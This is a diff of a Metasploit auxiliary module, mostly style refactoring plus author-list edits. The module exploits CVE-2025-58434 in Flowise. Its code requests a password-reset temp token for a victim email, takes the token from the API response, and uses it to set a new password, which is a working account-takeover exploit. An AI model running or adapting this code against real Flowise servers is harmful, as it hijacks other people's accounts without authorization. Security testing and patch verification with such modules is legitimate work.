@@ -1,6 +1,5 @@
 ##
 # This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
@@ -23,7 +22,9 @@ class MetasploitModule < Msf::Auxiliary
         },
         'License' => MSF_LICENSE,
         'Author' => [
-          'Richard howe <rhowe425>',
+          'Richard Howe',
+          'Isaac David',
+          'Arthur Gervais'
         ],
         'References' => [
           ['CVE', '2025-58434'],
@@ -32,8 +33,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'DisclosureDate' => '2025-09-12',
         'Notes' => {
-          'Stability' => [ CRASH_SAFE ],
-          'SideEffects' => [ IOC_IN_LOGS ],
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
           'Reliability' => []
         }
       )
@@ -42,20 +43,22 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(3000),
-        OptString.new('TARGETURI', [ true, 'Base path of the Flowise dashboard', '/' ]),
-        OptString.new('EMAIL', [ true, 'The email address of victim user', 'admin@local' ]),
-        OptString.new('NEWPASSWORD', [ true, 'The new password assigned to the victim user', 'password123' ]),
+        OptString.new('TARGETURI', [true, 'Base path of the Flowise dashboard', '/']),
+        OptString.new('EMAIL', [true, 'The email address of victim user', 'admin@local']),
+        OptString.new('NEWPASSWORD', [true, 'The new password assigned to the victim user', 'password123'])
       ]
     )
   end
 
   def check
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'api/v1/version')
-    })
+    res = send_request_cgi(
+      {
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, 'api/v1/version')
+      }
+    )
 
-    unless res && res.code == 200
+    unless res&.code == 200
       return Exploit::CheckCode::Unknown(
         'No response or unexpected status from Flowise API'
       )
@@ -90,8 +93,9 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    fail_with(Failure::Unknown, 'Unexpected server reply while requesting reset token.') unless res && res.code == 201
-    res.get_json_document['user']['tempToken']
+    fail_with(Failure::Unknown, 'Unexpected server reply while requesting reset token.') unless res&.code == 201
+
+    res.get_json_document.dig('user', 'tempToken')
   end
 
   def reset_password(email, token, password)
@@ -103,11 +107,16 @@ class MetasploitModule < Msf::Auxiliary
           'Content-Type' => 'application/json'
         },
         'data' => {
-          'user' => { 'email' => email, 'tempToken' => token, 'password' => password }
+          'user' => {
+            'email' => email,
+            'tempToken' => token,
+            'password' => password
+          }
         }.to_json
       }
     )
-    fail_with(Failure::Unknown, 'Unexpected server reply while resetting password.') unless res && res.code == 201
+
+    fail_with(Failure::Unknown, 'Unexpected server reply while resetting password.') unless res&.code == 201
   end
 
   def run
